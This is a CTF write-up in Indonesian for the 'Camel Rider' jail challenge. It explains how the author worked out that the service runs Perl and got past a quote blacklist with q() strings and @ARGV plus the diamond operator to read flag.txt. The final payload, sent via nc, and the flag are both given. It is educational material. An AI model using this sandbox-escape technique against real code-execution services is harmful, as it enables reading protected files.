# Camel Rider

## Informasi Challenge

* Kategori: Misc
* Tipe: Jail
* Hint: `flag.txt`

Service diberikan dalam bentuk koneksi remote:

```bash
nc chal3.teagod.tech <port>
```

Saat terhubung, service meminta input kode:

```text
Welcome to Camel Rider!
Type ur code
>
```

## Recon Awal

Awalnya service terlihat seperti Python jail karena beberapa payload Python sederhana masih menghasilkan output:

```python
print(1+1)
```

Output:

```text
2
```

Namun ada perilaku aneh ketika melakukan concatenation menggunakan operator `+`:

```python
print(chr(65)+chr(66))
```

Output:

```text
0
```

Jika benar-benar Python, hasilnya seharusnya:

```text
AB
```

Perilaku tersebut justru cocok dengan Perl. Di Perl, operator `+` digunakan untuk operasi numerik. String seperti `"A"` dan `"B"` dikonversi menjadi angka, sehingga:

```perl
"A" + "B"
```

menghasilkan:

```text
0
```

Dari sini dapat disimpulkan bahwa kode yang dikirim sebenarnya dieksekusi sebagai Perl.

## Mengidentifikasi Filter

Beberapa percobaan untuk membaca file secara langsung ditolak:

```perl
print(open("flag.txt").read())
```

Output:

```text
Meow
```

Begitu juga dengan penggunaan quote biasa dan beberapa fungsi sensitif lainnya.

Contoh:

```perl
print("A"."B")
```

Output:

```text
Meow
```

Hal ini menunjukkan adanya blacklist terhadap karakter atau keyword tertentu, terutama quote biasa:

```text
"
'
```

Namun Perl memiliki quote-like operator yang dapat membuat string tanpa menggunakan quote biasa, yaitu:

```perl
q(...)
```

Tes sederhana:

```perl
print(q(OK))
```

Output:

```text
OK
```

Artinya operator `q()` tidak diblokir dan dapat digunakan untuk membentuk nama file.

## Membentuk Nama File

Hint challenge menyebutkan bahwa flag berada di:

```text
flag.txt
```

Karena menulis string secara langsung diblokir, nama file dibagi menjadi beberapa bagian:

```perl
q(fl).q(ag).q(.txt)
```

Di Perl, operator `.` digunakan untuk concatenation string.

Ekspresi tersebut menghasilkan:

```text
flag.txt
```

## Membaca File dengan Diamond Operator

Perl memiliki special array bernama `@ARGV`.

Jika `@ARGV` berisi nama file, diamond operator:

```perl
<>
```

akan membuka dan membaca isi file tersebut.

Payload yang digunakan:

```perl
@ARGV=(q(fl).q(ag).q(.txt));print(<>)
```

Penjelasan:

```perl
@ARGV=(...)
```

Mengisi `@ARGV` dengan nama file `flag.txt`.

```perl
q(fl).q(ag).q(.txt)
```

Membentuk string `flag.txt` tanpa quote biasa.

```perl
<>
```

Membaca file yang namanya berada di `@ARGV`.

```perl
print(<>)
```

Mencetak isi file ke output.

## Exploit Final

Payload dikirim menggunakan:

```bash
printf '%s\n' '@ARGV=(q(fl).q(ag).q(.txt));print(<>)' \
| nc chal3.teagod.tech 10366
```

Output:

```text
Welcome to Camel Rider!
Type ur code
> NHNC{rf8fnibf3fhiqfwbqubGmoyt8191qv3rM}
```

## Flag

```text
NHNC{rf8fnibf3fhiqfwbqubGmoyt8191qv3rM}
```

##
